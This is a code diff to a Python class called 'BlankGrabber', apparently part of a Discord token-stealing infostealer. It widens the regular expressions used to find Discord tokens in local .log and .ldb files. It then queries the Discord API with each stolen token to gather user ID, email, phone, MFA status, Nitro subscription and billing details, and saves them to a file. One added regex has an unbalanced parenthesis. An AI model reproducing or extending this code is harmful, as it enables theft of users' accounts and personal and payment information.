@@ -439,7 +439,7 @@ class BlankGrabber:
                 if not filename.endswith((".log", ".ldb")):
                     continue
                 for line in [x.strip() for x in open(os.path.join(path, filename), errors="ignore").readlines() if x.strip()]:
-                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
+                    for reg in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"[\w]{24}\.[\w]{6}\.[\w]{40}", r"([\w]{26}\.[\w]{6}\.[\w]{38}"):
                         for token in re.findall(reg, line):
                             if not token in self.tokens:
                                 self.tokens.append(token)
@@ -470,14 +470,16 @@ class BlankGrabber:
                     continue
                 r = json.loads(r.data.decode())
                 user = r["username"] + "#" + str(r["discriminator"])
+                id = r["id"]
                 email = r["email"].strip() if r["email"] else "(No Email)"
                 phone = r["phone"] if r["phone"] else "(No Phone Number)"
                 verified=r["verified"]
+                mfa = r["mfa_enabled"]
                 nitro_data = json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/subscriptions", headers=self.headers(token)).data.decode())
-                has_nitro = False
                 has_nitro = len(nitro_data)>0
+
                 billing = len(json.loads(self.http.request("GET", "https://discordapp.com/api/v6/users/@me/billing/payment-sources", headers=self.headers(token)).data.decode()))>0
-                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nToken: {token}\nMFA: {'Yes' if token.startswith('mfa.') else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
+                data.append(f"{'Blank Grabber'.center(90, '-')}\n\nUsername: {user}\nUser ID: {id}\nToken: {token}\nMFA: {'Yes' if mfa else 'No'}\nEmail: {email}\nPhone: {phone}\nVerified: {verified}\nNitro: {'Yes' if has_nitro else 'No'}\nHas Billing Info: {'Yes' if billing else 'No'}")
         if len(data)!= 0:
             os.makedirs(discfolder := os.path.join(self.tempfolder, "Messenger", "Discord"), exist_ok= True)
             with open(os.path.join(discfolder, "Discord Info.txt"), "w", encoding= "utf-8", errors="ignore") as file:
